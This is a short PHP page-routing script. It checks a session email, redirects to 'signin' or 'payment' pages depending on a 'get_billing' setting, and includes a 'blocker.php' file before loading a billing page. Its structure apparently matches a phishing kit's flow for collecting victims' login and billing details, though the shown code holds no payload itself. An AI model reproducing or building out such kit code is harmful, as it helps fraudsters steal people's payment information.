<?php
session_start();
require_once('../main.php');
require_once('../lang.php');
require_once("../blocker.php");
// require_once("../blocker2.php");
require_once('../session.php');
require_once('../additional.php');
if($_SESSION['email'] == "") {
  header("location: signin?session=".$key);
  exit();
}
if($config['get_billing'] != "on") {
	header("location: payment?session=".$key);
	exit();
}
require_once("files/billing.php");